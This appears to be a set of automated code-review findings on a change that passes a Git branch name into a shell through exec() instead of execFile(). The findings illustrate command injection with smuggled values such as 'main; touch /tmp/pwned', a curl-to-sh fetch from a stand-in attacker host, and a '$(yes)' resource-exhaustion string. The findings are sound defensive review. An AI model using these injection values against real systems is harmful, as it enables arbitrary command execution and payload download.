findings.title: [P1] Keep branch names out of the shell
findings.body: When `branch` contains shell syntax, `exec()` interprets it rather than passing it literally to Git. For example, `showBranch("main; touch /tmp/pwned")` executes the additional command with the application's privileges. The previous `execFile("git", ["show", branch])` safely preserved the argument boundary and should be retained.

findings.title: [P1] Restore argument-vector execution to prevent shell command injection
findings.body:
`branch` is interpolated into a shell command. Any caller-provided value containing shell syntax executes arbitrary commands with the process’s privileges; for example, `HEAD; touch /tmp/pwned` runs both commands. Valid Git ref names may also contain shell metacharacters such as semicolons.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec()` invokes a shell, so any attacker-controlled branch value containing shell syntax executes arbitrary commands with the application’s privileges. For example, `showBranch("main; curl attacker/payload | sh")` runs the injected command; the previous `execFile()` implementation treated the entire value as a Git argument.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch names out of the shell to prevent unbounded resource consumption
findings.body:
Git permits shell metacharacters in branch names. On POSIX systems, a valid branch such as `foo$(yes)` causes `/bin/sh` to execute `yes` during command substitution and accumulate its endless output, consuming CPU and memory until termination or OOM. `exec`’s stdout `maxBuffer` does not protect command-substitution buffering. The previous `execFile` passed the branch literally.

_Recommend validating this comment independently._
